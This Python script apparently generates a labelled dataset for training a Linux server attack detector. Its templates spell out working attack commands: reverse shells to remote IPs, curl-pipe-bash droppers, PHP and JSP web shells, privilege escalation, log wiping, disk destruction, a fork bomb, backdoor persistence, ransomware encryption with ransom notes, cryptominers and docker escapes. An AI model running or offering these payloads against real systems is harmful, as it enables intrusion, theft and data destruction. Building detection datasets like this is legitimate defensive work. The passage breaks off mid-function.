"""
generate_enterprise_dataset.py
===============================
Enterprise VPS Security AI — Dataset Generator

Generates a production-quality dataset combining:
  - All existing web attack samples from balanced_attack_dataset.csv
  - 22 NEW Linux/VPS server attack categories
  - Augmented Benign server traffic

Target: ~40,000-50,000 samples, 48 classes, 60-70% server attacks.

Sources of inspiration:
  - PayloadsAllTheThings, SecLists, HackTricks, GTFOBins
  - MITRE ATT&CK, Atomic Red Team
  - auth.log, syslog, nginx/apache logs, docker logs, auditd, journalctl
"""

import pandas as pd
import numpy as np
import json
import random
import uuid
import os
from datetime import datetime, timedelta

random.seed(42)
np.random.seed(42)

# ════════════════════════════════════════════════════════════════
#  HELPER FUNCTIONS
# ════════════════════════════════════════════════════════════════

def rand_ip():
    return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

def rand_internal_ip():
    subnet = random.choice(["10.0.0", "10.0.1", "192.168.1", "172.16.0"])
    return f"{subnet}.{random.randint(2,254)}"

def rand_port():
    return random.randint(1024, 65535)

def rand_timestamp():
    base = datetime(2026, 8, random.randint(1,4), random.randint(0,23), random.randint(0,59), random.randint(0,59))
    return base.strftime("%b %d %H:%M:%S")  # e.g. "Aug 04 14:30:22"

def rand_ts_iso():
    base = datetime(2026, 8, random.randint(1,4), random.randint(0,23), random.randint(0,59), random.randint(0,59))
    return base.isoformat() + "Z"

def rand_hostname():
    return random.choice(["vps-prod-01", "web-server", "app-node-1", "db-master", "proxy-eu", "worker-03", "api-gateway"])

def rand_user():
    return random.choice(["root", "admin", "ubuntu", "deploy", "www-data", "postgres", "mysql", "nginx", "git", "jenkins", "user1", "devops", "backup"])

def rand_pid():
    return random.randint(1000, 65535)

def make_unique(payloads, n):
    """Ensure we get exactly n unique payloads."""
    result = list(set(payloads))
    # If we don't have enough, keep generating slight variations
    attempts = 0
    while len(result) < n and attempts < n * 5:
        for p in list(payloads):
            if len(result) >= n:
                break
            variant = p + f" # {uuid.uuid4().hex[:6]}"
            if variant not in result:
                result.append(variant)
        attempts += 1
    return result[:n]


# ════════════════════════════════════════════════════════════════
#  SERVER ATTACK GENERATORS (22 new classes)
# ════════════════════════════════════════════════════════════════

def gen_ssh_bruteforce(n=800):
    payloads = []
    for _ in range(n * 3):
        ip = rand_ip()
        port = rand_port()
        ts = rand_timestamp()
        host = rand_hostname()
        pid = rand_pid()
        user = random.choice(["root", "admin", "ubuntu", "test", "oracle", "postgres", "pi", "ftp", "user"])
        templates = [
            f"{ts} {host} sshd[{pid}]: Failed password for {user} from {ip} port {port} ssh2",
            f"{ts} {host} sshd[{pid}]: Failed password for invalid user {user} from {ip} port {port} ssh2",
            f"{ts} {host} sshd[{pid}]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost={ip} user={user}",
            f"{ts} {host} sshd[{pid}]: error: maximum authentication attempts exceeded for {user} from {ip} port {port} ssh2 [preauth]",
            f"{ts} {host} sshd[{pid}]: Disconnecting authenticating user {user} {ip} port {port}: Too many authentication failures [preauth]",
            f"{ts} {host} sshd[{pid}]: Failed publickey for {user} from {ip} port {port} ssh2: RSA SHA256:AAAA",
            f"Connection from {ip} port {port} on {rand_internal_ip()} port 22 rdomain \"\" [preauth] failed password for {user}",
        ]
        payloads.append(random.choice(templates))
    return make_unique(payloads, n)

def gen_ssh_login_attack(n=800):
    payloads = []
    for _ in range(n * 3):
        ip = rand_ip()
        port = rand_port()
        ts = rand_timestamp()
        host = rand_hostname()
        pid = rand_pid()
        user = random.choice(["admin", "administrator", "test", "guest", "support", "info", "ftpuser", "mysql", "oracle", "backup", "tomcat", "nagios"])
        templates = [
            f"{ts} {host} sshd[{pid}]: Invalid user {user} from {ip} port {port}",
            f"{ts} {host} sshd[{pid}]: input_userauth_request: invalid user {user} [preauth]",
            f"{ts} {host} sshd[{pid}]: Received disconnect from {ip} port {port}:11: Bye Bye [preauth]",
            f"{ts} {host} sshd[{pid}]: Connection closed by invalid user {user} {ip} port {port} [preauth]",
            f"{ts} {host} sshd[{pid}]: User {user} from {ip} not allowed because not listed in AllowUsers",
            f"{ts} {host} sshd[{pid}]: refused connect from {ip} ({ip})",
            f"{ts} {host} sshd[{pid}]: Did not receive identification string from {ip} port {port}",
        ]
        payloads.append(random.choice(templates))
    return make_unique(payloads, n)

def gen_reverse_shell(n=800):
    payloads = []
    for _ in range(n * 3):
        ip = rand_ip()
        port = random.choice([4444, 4445, 5555, 8888, 9001, 1337, 443, 80, 9999])
        templates = [
            f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            f"/bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'",
            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
            f"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            f"python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'",
            f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
            f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            f"nc -e /bin/sh {ip} {port}",
            f"ncat {ip} {port} -e /bin/bash",
            f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}",
            f"0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196",
            f"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done",
            f"lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
            f"mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc {ip} {port} 1>/tmp/backpipe",
        ]
        payloads.append(random.choice(templates))
    return make_unique(payloads, n)

def gen_privilege_escalation(n=800):
    payloads = []
    for _ in range(n * 3):
        templates = [
            f"sudo -u root /usr/bin/find / -exec /bin/sh \\;",
            f"sudo /usr/bin/python3 -c 'import os; os.system(\"/bin/bash\")'",
            f"sudo /usr/bin/perl -e 'exec \"/bin/sh\";'",
            f"sudo /usr/bin/vim -c ':!/bin/sh'",
            f"sudo /usr/bin/awk 'BEGIN {{system(\"/bin/sh\")}}'",
            f"sudo /usr/bin/less /etc/shadow",
            f"sudo /usr/bin/nmap --interactive",
            f"echo 'user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers",
            f"cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash && /tmp/rootbash -p",
            f"find / -perm -4000 -type f 2>/dev/null",
            f"find / -writable -type f 2>/dev/null | grep -v proc",
            f"getcap -r / 2>/dev/null",
            f"cat /etc/cron* | grep -v '#'",
            f"sudo /usr/bin/env /bin/bash",
            f"sudo /usr/bin/node -e 'require(\"child_process\").spawn(\"/bin/sh\", {{stdio: [0, 1, 2]}})'",
            f"sudo /usr/bin/ruby -e 'exec \"/bin/sh\"'",
            f"/usr/bin/pkexec /bin/bash",
            f"echo '{rand_user()} ALL=(ALL) NOPASSWD: ALL' | sudo tee /etc/sudoers.d/{uuid.uuid4().hex[:6]}",
            f"sudo /usr/sbin/service ../../tmp/exploit",
            f"LFILE=/etc/shadow && sudo /usr/bin/cat $LFILE",
        ]
        payloads.append(random.choice(templates))
    return make_unique(payloads, n)

def gen_suspicious_bash(n=800):
    payloads = []
    for _ in range(n * 3):
        ip = rand_ip()
        templates = [
            f"history -c && unset HISTFILE && export HISTFILESIZE=0",
            f"unset HISTFILE HISTFILESIZE HISTSIZE",
            f"export HISTSIZE=0 && export HISTFILESIZE=0",
            f"rm -f ~/.bash_history && ln -s /dev/null ~/.bash_history",
            f"shred -zu ~/.bash_history",
            f"echo '' > /var/log/auth.log && echo '' > /var/log/syslog",
            f"cat /dev/null > /var/log/wtmp",
            f"truncate -s 0 /var/log/lastlog",
            f"for log in $(find /var/log -type f); do cat /dev/null > $log; done",
            f"echo 'nameserver {ip}' > /etc/resolv.conf",
            f"iptables -F && iptables -P INPUT ACCEPT && iptables -P FORWARD ACCEPT",
            f"setenforce 0 && sed -i 's/SELINUX=enforcing/SELINUX=disabled/' /etc/selinux/config",
            f"systemctl stop apparmor && systemctl disable apparmor",
            f"echo 0 > /proc/sys/kernel/randomize_va_space",
            f"sysctl -w kernel.randomize_va_space=0",
            f"ulimit -c unlimited",
            f"echo 'net.ipv4.ip_forward = 1' >> /etc/sysctl.conf && sysctl -p",
            f"modprobe -r ufw",
        ]
        payloads.append(random.choice(templates))
    return make_unique(payloads, n)

def gen_linux_cmd_injection(n=800):
    payloads = []
    for _ in range(n * 3):
        ip = rand_ip()
        templates = [
            f"; rm -rf / --no-preserve-root",
            f"; cat /etc/shadow",
            f"| nc {ip} {random.randint(1000,9999)} -e /bin/bash",
            f"`wget http://{ip}/backdoor.sh -O /tmp/bd.sh && bash /tmp/bd.sh`",
            f"$(curl http://{ip}/payload | bash)",
            f"; mkfifo /tmp/pipe; sh -i < /tmp/pipe 2>&1 | nc {ip} {random.randint(4000,9999)} > /tmp/pipe",
            f"&& useradd -o -u 0 -g 0 -M -s /bin/bash backdoor{random.randint(1,99)} -p $(openssl passwd -1 pass123)",
            f"; echo '{rand_user()}:x:0:0::/root:/bin/bash' >> /etc/passwd",
            f"| tee /etc/cron.d/backdoor{random.randint(1,99)} <<< '* * * * * root curl http://{ip}/c | bash'",
            f"; python3 -c \"import os; os.system('id')\"",
            f"$(id)$(whoami)$(uname -a)",
            f"; dd if=/dev/urandom of=/dev/sda bs=1M count=1000",
            f"| xargs -I {{}} curl http://{ip}/exfil?data={{}}",
        ]
        payloads.append(random.choice(templates))
    return make_unique(payloads, n)

def gen_webshell(n=800):
    payloads = []
    for _ in range(n * 3):
        templates = [
            f"<?php system($_GET['cmd']); ?>",
            f"<?php echo shell_exec($_REQUEST['c']); ?>",
            f"<?php passthru($_POST['cmd']); ?>",
            f"<?php eval(base64_decode($_POST['e'])); ?>",
            f"<?php $cmd=$_GET['cmd']; $output=shell_exec($cmd); echo \"<pre>$output</pre>\"; ?>",
            f"<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
            f"<%@ page import=\"java.util.*,java.io.*\" %><% Process p=Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
            f"<?php if(isset($_REQUEST['upload'])){{move_uploaded_file($_FILES['file']['tmp_name'],'./'.$_FILES['file']['name']);}} ?>",
            f"<?php $sock=fsockopen('{rand_ip()}',{random.randint(4000,9999)});exec('/bin/sh -i <&3 >&3 2>&3'); ?>",
            f"<?php echo `$_GET[0]`; ?>",
            f"<?=`$_GET[0]`?>",
            f"<script language=\"JScript\" runat=\"server\">function Page_Load(){{eval(Request[\"cmd\"],\"unsafe\");}}</script>",
            f"<?php file_put_contents('shell_{uuid.uuid4().hex[:6]}.php','<?php system($_GET[\"c\"]); ?>'); ?>",
            f"<?php preg_replace('/.*/e',$_POST['code'],''); ?>",
        ]
        payloads.append(random.choice(templates))
    return make_unique(payloads, n)

def gen_port_scanning(n=800):
    payloads = []
    for _ in range(n * 3):
        target = random.choice([rand_ip(), rand_internal_ip(), f"{rand_internal_ip()}/24", f"{rand_internal_ip()}/16"])
        templates = [
            f"nmap -sS -p 1-65535 {target}",
            f"nmap -sV -sC -O {target}",
            f"nmap -sU -p 53,67,68,69,123,161,162,500 {target}",
            f"nmap -Pn -sS --top-ports 1000 {target}",
            f"nmap -sn {target}",
            f"nmap --script vuln {target}",
            f"masscan -p1-65535 {target} --rate=10000",
            f"rustscan -a {target} --ulimit 5000",
            f"zmap -p 80 {target} -o results.csv",
            f"nc -zv {rand_internal_ip()} 1-1024",
            f"for port in $(seq 1 1024); do (echo >/dev/tcp/{rand_internal_ip()}/$port) 2>/dev/null && echo \"Port $port open\"; done",
            f"hping3 -S -p 80 {target} -c 5",
            f"nmap -sA -p 22,80,443,3306,5432,6379,27017 {target}",
        ]
        payloads.append(random.choice(templates))
    return make_unique(payloads, n)

def gen_docker_abuse(n=800):
    payloads = []
    for _ in range(n * 3):
        ip = rand_ip()
        templates = [
            f"docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
            f"docker run -v /:/mnt --rm alpine cat /mnt/etc/shadow",
            f"docker run --privileged --pid=host -it alpine nsenter -t 1 -m -u -i -n -- /bin/bash",
            f"docker run --rm -it --net=host alpine sh",
            f"docker exec -it $(docker ps -q | head -1) /bin/bash",
            f"docker cp $(docker ps -q | head -1):/etc/passwd /tmp/container_passwd",
            f"docker run --rm -v /var/run/docker.sock:/var/run/docker.sock docker sh",
            f"curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json",
            f"docker run -d --restart=always -p 8080:8080 -v /:/hostfs alpine sh -c 'nc -l -p 8080 -e /bin/sh'",
            f"docker run --cap-add=ALL --security-opt apparmor=unconfined -it ubuntu bash",
            f"docker save $(docker images -q) -o /tmp/all_images.tar",
            f"docker run -v /root/.ssh:/root/.ssh alpine cat /root/.ssh/id_rsa",
            f"docker run --rm -it -v /:/host alpine chroot /host useradd -o -u 0 backdoor",
        ]
        payloads.append(random.choice(templates))
    return make_unique(payloads, n)

def gen_cron_abuse(n=800):
    payloads = []
    for _ in range(n * 3):
        ip = rand_ip()
        templates = [
            f"echo '* * * * * root /tmp/backdoor.sh' >> /etc/crontab",
            f"echo '*/5 * * * * curl http://{ip}/c | bash' | crontab -",
            f"echo '* * * * * root bash -i >& /dev/tcp/{ip}/{random.randint(4000,9999)} 0>&1' > /etc/cron.d/revshell",
            f"crontab -l | {{ cat; echo '0 * * * * wget -q http://{ip}/miner -O /tmp/.m && chmod +x /tmp/.m && /tmp/.m'; }} | crontab -",
            f"echo '* * * * * /usr/bin/python3 -c \"import os;os.system(\\'curl {ip}/cmd|sh\\')\"' >> /var/spool/cron/crontabs/root",
            f"at now + 1 minute <<< 'bash /tmp/payload.sh'",
            f"echo '@reboot /tmp/.hidden/persist.sh' >> /var/spool/cron/root",
            f"systemctl enable --now /tmp/malicious.timer",
            f"echo '30 2 * * * root /opt/.backup/exfil.sh' > /etc/cron.d/legit-backup",
            f"cp /tmp/evil_script.sh /etc/cron.daily/update-check",
        ]
        payloads.append(random.choice(templates))
    return make_unique(payloads, n)

def gen_persistence(n=800):
    payloads = []
    for _ in range(n * 3):
        ip = rand_ip()
        port = random.randint(4000, 9999)
        templates = [
            f"echo 'bash -i >& /dev/tcp/{ip}/{port} 0>&1' >> ~/.bashrc",
            f"echo 'bash -i >& /dev/tcp/{ip}/{port} 0>&1' >> /etc/profile",
            f"echo 'ssh-rsa AAAA{uuid.uuid4().hex}== attacker@evil' >> /root/.ssh/authorized_keys",
            f"cp /bin/bash /tmp/.suid_bash && chmod u+s /tmp/.suid_bash",
            f"echo '/tmp/.hidden/beacon.sh &' >> /etc/rc.local",
            f"systemctl enable /tmp/malicious.service",
            f"cat > /etc/systemd/system/backdoor.service << 'EOF'\n[Service]\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'\nRestart=always\n[Install]\nWantedBy=multi-user.target\nEOF",
            f"ln -sf /tmp/evil.sh /etc/init.d/networking",
            f"echo '#!/bin/bash\ncurl http://{ip}/beacon' > /usr/local/bin/update-notifier && chmod +x /usr/local/bin/update-notifier",
            f"useradd -o -u 0 -g 0 -M -d /root -s /bin/bash {uuid.uuid4().hex[:6]}",
            f"echo '{uuid.uuid4().hex[:6]}::0:0::/root:/bin/bash' >> /etc/passwd",
            f"mkdir -p /usr/lib/.hidden && cp /tmp/implant /usr/lib/.hidden/syslogd && echo '/usr/lib/.hidden/syslogd &' >> /etc/rc.local",
            f"pam_backdoor: echo 'auth sufficient pam_permit.so' >> /etc/pam.d/sshd",
        ]
        payloads.append(random.choice(templates))
    return make_unique(payloads, n)

def gen_malicious_system_cmd(n=800):
    payloads = []
    for _ in range(n * 3):
        templates = [
            f"dd if=/dev/zero of=/dev/sda bs=1M",
            f"dd if=/dev/urandom of=/dev/sda bs=4M count=500",
            f"rm -rf / --no-preserve-root",
            f"mkfs.ext4 /dev/sda1",
            f":()" + "{" + ":|:&" + "}" + ";:",  # fork bomb
            f"echo c > /proc/sysrq-trigger",
            f"echo 1 > /proc/sys/kernel/sysrq && echo o > /proc/sysrq-trigger",
            f"kill -9 1",
            f"chmod -R 777 /",
            f"chown -R nobody:nogroup /etc /var /usr",
            f"mv /usr/bin/sudo /usr/bin/sudo.bak",
            f"echo '' > /etc/passwd",
            f"shred -vfz -n 5 /dev/sda",
            f"swapoff -a && dd if=/dev/zero of=/dev/sda",
            f"cat /dev/urandom > /dev/kmem",
            f"echo '0 0 0 0' > /proc/sys/kernel/printk",
            f"insmod /tmp/rootkit.ko",
        ]
        payloads.append(random.choice(templates))
    return make_unique(payloads, n)

def gen_unauthorized_file_mod(n=800):
    payloads = []
    for _ in range(n * 3):
        ts = rand_timestamp()
        host = rand_hostname()
        templates = [
            f"chmod 4755 /tmp/{uuid.uuid4().hex[:6]}; chown root:root /tmp/{uuid.uuid4().hex[:6]}",
            f"chmod u+s /usr/bin/find",
            f"chmod 777 /etc/shadow",
            f"chattr -i /etc/passwd && echo 'backdoor::0:0::/root:/bin/bash' >> /etc/passwd",
            f"{ts} {host} auditd: type=SYSCALL msg=audit(1722000000.{random.randint(100,999)}): arch=c000003e syscall=90 success=yes exit=0 items=1 ppid=1 pid={rand_pid()} auid=0 uid=0 comm=\"chmod\" exe=\"/usr/bin/chmod\" key=\"file_modification\"",
            f"sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config",
            f"echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers",
            f"cp /bin/sh /tmp/.hidden_shell && chmod 4755 /tmp/.hidden_shell",
            f"touch -t 202001010000 /tmp/backdoor.sh",
            f"mv /var/log/auth.log /var/log/auth.log.bak && touch /var/log/auth.log",
            f"chattr +ia /tmp/malware.bin",
            f"ln -sf /etc/shadow /tmp/readable_shadow",
            f"mount -o bind /tmp/fake_passwd /etc/passwd",
        ]
        payloads.append(random.choice(templates))
    return make_unique(payloads, n)

def gen_suspicious_process(n=800):
    payloads = []
    for _ in range(n * 3):
        ip = rand_ip()
        pid = rand_pid()
        templates = [
            f"root {pid} 0.0 0.1 ./miner --algo=randomx --pool=xmr.pool.com:3333 --user=4{uuid.uuid4().hex[:20]}",
            f"www-data {pid} 99.0 50.0 /tmp/.X11-unix/.cache/xmrig -o stratum+tcp://{ip}:3333",
            f"root {pid} 0.0 0.0 /usr/sbin/..hidden/kworker",
            f"nobody {pid} 45.0 10.0 /dev/shm/.tmp/{uuid.uuid4().hex[:8]}",
            f"root {pid} 0.0 0.0 [kthreadd_{uuid.uuid4().hex[:4]}]",
            f"ps aux | grep -E 'nc|ncat|socat|bash.*tcp' | grep -v grep shows {pid} /bin/bash -i connected to {ip}",
            f"lsof -i :{random.randint(4000,9999)} shows PID {pid} ESTABLISHED to {ip}",
            f"strace -p {pid} shows connect(3, {{sa_family=AF_INET, sin_port=htons({random.randint(4000,9999)}), sin_addr=inet_addr(\"{ip}\")}}, 16)",
            f"root {pid} 0.0 0.0 /tmp/.ICE-unix/kswapd0",
            f"/proc/{pid}/exe -> /tmp/.hidden/backdoor (deleted)",
            f"netstat -tlnp shows {ip}:{random.randint(4000,9999)} ESTABLISHED PID/{pid}/bash",
        ]
        payloads.append(random.choice(templates))
    return make_unique(payloads, n)

def gen_system_enumeration(n=800):
    payloads = []
    for _ in range(n * 3):
        templates = [
            f"cat /etc/passwd && cat /etc/shadow && cat /etc/group",
            f"uname -a && id && whoami && hostname",
            f"ifconfig -a && ip addr && ip route && cat /etc/resolv.conf",
            f"cat /proc/version && lsb_release -a",
            f"dpkg -l && rpm -qa",
            f"netstat -tlnp && ss -tlnp",
            f"ps auxww && top -bn1",
            f"find / -perm -4000 -type f 2>/dev/null",
            f"find / -writable -type d 2>/dev/null",
            f"cat /etc/crontab && ls -la /etc/cron.d/ && crontab -l",
            f"cat /etc/fstab && mount && df -h",
            f"env && printenv && set",
            f"cat /proc/self/status && cat /proc/self/maps",
            f"ls -la /root/ && ls -la /home/",
            f"sestatus && aa-status && getenforce",
            f"systemctl list-units --type=service --state=running",
            f"iptables -L -n && iptables -t nat -L -n",
            f"cat /etc/ssh/sshd_config && cat /etc/sudoers",
            f"w && who && last -20",
            f"lsmod && modinfo $(lsmod | awk 'NR>1 {{print $1}}')",
        ]
        payloads.append(random.choice(templates))
    return make_unique(payloads, n)

def gen_kernel_exploit(n=800):
    payloads = []
    for _ in range(n * 3):
        templates = [
            f"./dirty_cow /usr/bin/passwd",
            f"gcc -pthread dirty.c -o dirty -lcrypt && ./dirty",
            f"./CVE-2021-4034 # PwnKit pkexec LPE",
            f"./CVE-2022-0847 # DirtyPipe exploit",
            f"./CVE-2016-5195 # DirtyCow race condition",
            f"./exploit --target /proc/self/mem --offset 0x{uuid.uuid4().hex[:8]}",
            f"gcc -o exploit exploit.c -Wall && ./exploit",
            f"python3 CVE-2021-3156.py --target /usr/bin/sudoedit",
            f"./baron_samedit --cmd '/bin/bash' --target sudoedit",
            f"echo 'AAAA%p%p%p%p' > /proc/sysrq-trigger",
            f"modprobe ./rootkit_{uuid.uuid4().hex[:6]}.ko",
            f"insmod kernel_exploit.ko && dmesg | tail -5",
            f"./overlayfs_exploit --shell /bin/bash",
            f"python3 -c 'from ctypes import *; libc=CDLL(\"libc.so.6\"); libc.setuid(0); import os; os.system(\"/bin/bash\")'",
            f"./cve_2024_{random.randint(1000,9999)}_exploit --escalate",
        ]
        payloads.append(random.choice(templates))
    return make_unique(payloads, n)

def gen_linux_malware(n=800):
    payloads = []
    for _ in range(n * 3):
        ip = rand_ip()
        templates = [
            f"wget http://{ip}/bot.sh -O /tmp/.hidden && chmod +x /tmp/.hidden && /tmp/.hidden",
            f"curl -s http://{ip}/payload | bash",
            f"curl http://{ip}/dropper.sh -o /dev/shm/.cache && chmod 755 /dev/shm/.cache && nohup /dev/shm/.cache &",
            f"wget -q http://{ip}/elf_malware -O /tmp/.X11-unix/{uuid.uuid4().hex[:8]} && chmod +x /tmp/.X11-unix/{uuid.uuid4().hex[:8]} && /tmp/.X11-unix/{uuid.uuid4().hex[:8]}",
            f"cd /tmp && wget http://{ip}/tsunami && chmod 777 tsunami && ./tsunami",
            f"echo '{uuid.uuid4().hex}' | base64 -d > /tmp/.syslog && chmod +x /tmp/.syslog && /tmp/.syslog &",
            f"python3 -c 'import urllib.request; urllib.request.urlretrieve(\"http://{ip}/implant\", \"/tmp/.cache_{uuid.uuid4().hex[:6]}\"); import os; os.chmod(\"/tmp/.cache_{uuid.uuid4().hex[:6]}\", 0o755); os.system(\"/tmp/.cache_{uuid.uuid4().hex[:6]}\")'",
            f"(crontab -l 2>/dev/null; echo '*/10 * * * * curl -s http://{ip}/heartbeat | bash') | crontab -",
            f"cd /dev/shm && curl -O http://{ip}/kinsing && chmod +x kinsing && ./kinsing &",
            f"busybox wget http://{ip}/mips_bot -O /tmp/bot; chmod 777 /tmp/bot; /tmp/bot",
        ]
        payloads.append(random.choice(templates))
    return make_unique(payloads, n)

def gen_ransomware(n=800):
    payloads = []
    for _ in range(n * 3):
        key = uuid.uuid4().hex[:16]
        templates = [
            f"openssl enc -aes-256-cbc -in important.db -out important.db.locked -k {key}",
            f"find /home -type f -name '*.pdf' -exec openssl enc -aes-256-cbc -salt -in {{}} -out {{}}.encrypted -k {key} \\;",
            f"find / -type f \\( -name '*.doc' -o -name '*.pdf' -o -name '*.jpg' \\) -exec gpg --batch --yes --passphrase {key} -c {{}} \\;",
            f"tar czf - /home /var/www /opt | openssl enc -aes-256-cbc -e -pass pass:{key} > /tmp/backup.tar.gz.enc",
            f"for f in $(find /var/www -type f); do openssl enc -aes-256-cbc -in $f -out $f.{uuid.uuid4().hex[:4]} -k {key} && rm $f; done",
            f"echo 'YOUR FILES HAVE BEEN ENCRYPTED. Pay {random.randint(1,10)} BTC to {uuid.uuid4().hex[:20]} to decrypt.' > /root/README_DECRYPT.txt",
            f"find /home -type f -exec mv {{}} {{}}.locked \\; && echo 'Files encrypted. Contact decrypt@{uuid.uuid4().hex[:6]}.onion' > /home/DECRYPT_INSTRUCTIONS.txt",
            f"python3 -c \"from cryptography.fernet import Fernet; k=Fernet.generate_key(); f=Fernet(k); import glob; [open(x+'._locked','wb').write(f.encrypt(open(x,'rb').read())) for x in glob.glob('/var/www/**/*', recursive=True)]\"",
            f"gpg --batch --yes --passphrase '{key}' --symmetric --cipher-algo AES256 /etc/nginx/nginx.conf",
        ]
        payloads.append(random.choice(templates))
    return make_unique(payloads, n)

def gen_cryptomining(n=800):
    payloads = []
    for _ in range(n * 3):
        wallet = f"4{uuid.uuid4().hex[:20]}"
        pool = random.choice(["pool.minexmr.com", "xmr.pool.minergate.com", "monerohash.com", "pool.supportxmr.com", "xmrpool.eu"])
        templates = [
            f"./xmrig --donate-level=0 -o {pool}:3333 -u {wallet} -p x -t $(nproc)",
            f"./xmrig -o stratum+tcp://{pool}:443 -u {wallet} --tls --cpu-max-threads-hint=75",
            f"wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz -O /tmp/x.tar.gz && cd /tmp && tar xzf x.tar.gz && ./xmrig-*/xmrig -o {pool}:3333 -u {wallet}",
            f"curl -s http://{rand_ip()}/miner.sh | bash  # Downloads and runs XMRig miner",
            f"docker run -d --name={uuid.uuid4().hex[:6]} --restart=always -c 512 kannix/monern-miner -o {pool}:3333 -u {wallet}",
            f"/tmp/.ICE-unix/xmrig --algo=randomx --url={pool}:3333 --user={wallet} --background",
            f"nohup /dev/shm/.cache/kswapd0 -o {pool}:443 -u {wallet} --tls >/dev/null 2>&1 &",
            f"screen -dmS worker ./xmrig --config=/tmp/.config_{uuid.uuid4().hex[:6]}.json",
            f"nice -n 19 /tmp/.hidden/miner --threads=$(nproc) --pool={pool}:3333 --wallet={wallet}",
        ]
        payloads.append(random.choice(templates))
    return make_unique(payloads, n)

def gen_failed_login(n=800):
    payloads = []
    for _ in range(n * 3):
        ip = rand_ip()
        ts = rand_timestamp()
        host = rand_hostname()
        pid = rand_pid()
        user = rand_user()
        templates = [
            f"{ts} {host} sshd[{pid}]: Failed password for {user} from {ip} port {rand_port()} ssh2",
            f"{ts} {host} login[{pid}]: FAILED LOGIN ({random.randint(1,5)}) on '/dev/tty1' FOR '{user}', Authentication failure",
            f"{ts} {host} sudo: pam_unix(sudo:auth): authentication failure; logname={user} uid={random.randint(1000,5000)} euid=0 tty=/dev/pts/{random.randint(0,9)} ruser={user} rhost= user={user}",
            f"{ts} {host} su[{pid}]: FAILED su for root by {user}",
            f"{ts} {host} systemd-logind[{pid}]: Failed to authenticate user {user}: Access denied",
            f"{ts} {host} gdm-password][{pid}]: pam_unix(gdm-password:auth): authentication failure; logname= uid=0 euid=0 ruser= rhost= user={user}",
            f"{ts} {host} vsftpd[{pid}]: pam_unix(vsftpd:auth): authentication failure; rhost={ip} user={user}",
            f"{ts} {host} dovecot[{pid}]: imap-login: Disconnected (auth failed, 1 attempts): user=<{user}>, method=PLAIN, rip={ip}",
        ]
        payloads.append(random.choice(templates))
    return make_unique(payloads, n)

def gen_root_login_attempt(n=800):
    payloads = []
    for _ in range(n * 3):
        ip = rand_ip()
        ts = rand_timestamp()
        host = rand_hostname()
        pid = rand_pid()
        templates = [
            f"{ts} {host} sshd[{pid}]: Accepted password for root from {ip} port {rand_port()} ssh2",
            f"{ts} {host} sshd[{pid}]: Accepted publickey for root from {ip} port {rand_port()} ssh2: RSA SHA256:{uuid.uuid4().hex[:20]}",
            f"{ts} {host} sshd[{pid}]: ROOT LOGIN REFUSED FROM {ip}",
            f"{ts} {host} su[{pid}]: Successful su for root by {rand_user()}",
            f"{ts} {host} su[{pid}]: + /dev/pts/{random.randint(0,9)} {rand_user()}:root",
            f"{ts} {host} sudo: {rand_user()} : TTY=pts/{random.randint(0,9)} ; PWD=/home/{rand_user()} ; USER=root ; COMMAND=/bin/bash",
            f"{ts} {host} sshd[{pid}]: pam_unix(sshd:session): session opened for user root by (uid=0)",
            f"{ts} {host} login[{pid}]: ROOT LOGIN ON tty1 FROM {ip}",
        ]
        payloads.append(random.choice(templates))
    return make_unique(payloads, n)

def gen_lateral_movement(n=800):
    payloads = []
    for _ in range(n * 3):
        src_ip = rand_internal_ip()
        dst_ip = rand_internal_ip()
        user = rand_user()
        templates = [
            f"scp /tmp/payload.sh {user}@{dst_ip}:/tmp/ && ssh {user}@{dst_ip} 'bash /tmp/payload.sh'",
            f"ssh -o StrictHostKeyChecking=no {user}@{dst_ip} 'wget http://{rand_ip()}/implant -O /tmp/i && chmod +x /tmp/i && /tmp/i'",
            f"for host in {rand_internal_ip()} {rand_internal_ip()} {rand_internal_ip()}; do scp /tmp/worm.sh {user}@$host:/tmp/ && ssh {user}@$host 'bash /tmp/worm.sh'; done",
            f"psexec.py {user}:password123@{dst_ip} cmd.exe",
            f"ssh -R {random.randint(8000,9999)}:localhost:22 {user}@{rand_ip()} -fN",
